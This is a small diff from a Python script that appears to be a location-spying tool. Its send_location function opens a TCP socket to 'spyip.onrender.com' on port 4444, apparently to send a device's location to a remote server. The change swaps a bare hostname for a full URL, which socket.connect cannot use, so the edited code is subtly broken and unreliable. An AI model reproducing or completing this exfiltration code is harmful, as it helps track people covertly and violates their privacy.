@@ -13,7 +13,7 @@ def get_location():
         return None, None
 
 def send_location():
-    host = 'spyip.onrender.com'
+    host = 'https://spyip.onrender.com/'
     port = 4444
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
